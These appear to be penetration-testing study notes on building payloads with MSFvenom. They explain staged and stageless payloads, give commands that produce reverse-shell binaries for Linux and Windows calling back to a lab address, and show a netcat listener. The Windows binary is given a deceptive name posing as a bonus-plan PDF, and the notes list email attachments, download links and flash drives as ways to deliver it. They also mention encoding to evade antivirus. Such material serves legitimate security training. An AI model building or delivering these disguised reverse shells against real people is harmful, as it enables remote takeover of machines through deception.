- There will be situations where we do not have direct network access to a vulnerable target machine. In these cases, we will need to get crafty in how the payload gets delivered and executed on the system
- <span style="color:rgb(0, 176, 80)">MSFvenom</span> also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures. Let's practice a bit with these concepts.

```bash
msfvenom -l payloads
```
list all the payload present in msfvenom
- staged - makes a stage in the target
- stageless - no need to stage any payloads low bandwidth
[more about stagless](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

#### Building A Stageless Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

`-p` create a payload
`-f elf ` The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### execute the payload

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

#### Building a simple Stageless Payload for a Windows system

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

```shell-session
sudo nc -lvnp 443
```
for the listing 